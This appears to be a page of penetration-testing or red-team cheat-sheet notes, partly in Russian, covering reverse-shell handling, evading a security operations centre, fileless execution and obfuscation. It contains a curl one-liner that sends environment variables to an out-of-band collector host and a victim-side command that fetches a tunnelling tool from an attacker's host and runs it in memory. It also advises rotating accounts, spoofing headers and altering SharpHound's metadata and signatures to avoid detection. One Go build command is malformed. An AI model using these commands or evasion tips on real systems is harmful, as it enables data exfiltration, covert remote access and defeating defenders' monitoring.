## CLI tricks

Use `script` command to log history from your reverse shells:
```
script filename.out
```
Use [rlwrap](https://github.com/hanslub42/rlwrap) to add some comfort into nc shells.

To safe a process from killing during an accidental closing of the ssh shell you can run it in the screen utility:
```bash
screen -S nmap-scan # initsialize a new screen called nmap-scan
# Ctrl+A D to exit screen
screen -r nmap-scan # dip into previous screen again
```

To pass data into curl directly from stdin:
```bash
env | grep PLUGIN_FLAG | curl -X POST --data-binary @- https://id.oastify.com/oast
```
## SOC evasion

Желательно использовать одну учетную запись для входа с каждого IP-адреса, не переиспользовать их, а также не подключаться с тех адресов, которые использовались для внешней разведки.

Рекомендуется менять заголовки `X-Forwarded-For` и `User-Agent` во время использования автоматических средств.

Помимо обфускации исходного кода у известных утилит, таких, как SharpHound, рекомендуется также изменять их метаданные (описание, заданное разработчиком исходное имя, цифровую подпись и т. д.), а также зашивать ключи для запуска, чтобы их не было видно в процессах.
## Living off the land

Run ELF executables directly from the memory with [DDExec](https://github.com/arget13/DDexec):

```bash
attacker@kali$ cat revsocks | base64 -w0 > revsocks.b64
attacker@kali$ python3 -m http.server
```

```bash
user@victim$: curl $KALI_ADDR:8000/revsocks.b64 | bash <(curl $KALI_ADDR:8000/ddexec.sh) /bin/nothing-here -connect $KALI_ADDR:8443 -pass SuperSecretPassword
```
It is also possible [to run DDExec without dd](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/ddexec).

To compile executables without dependencies:
```
gcc -static exp.c -o exp -l mnl -l nftnl -w
CGO_ENABLED=0 go build ldflags='-s -w' -o /cmd/agent/main.go # golang
```
You can also try [static-get](https://github.com/minos-org/minos-static).

>Notice that Alpine uses musl libc instead of glibc.

[Mitigations](https://www.cisa.gov/sites/default/files/2024-02/Joint-Guidance-Identifying-and-Mitigating-LOTL_V3508c.pdf?utm_source=convertkit&utm_medium=email&utm_campaign=%F0%9F%A4%94+Do+you+even+know+the+difference%3F%20-%2013071642)
## Obfuscation

### NetAssembly

https://github.com/b4rtik/metasploit-execute-assembly

### LLVM

TODO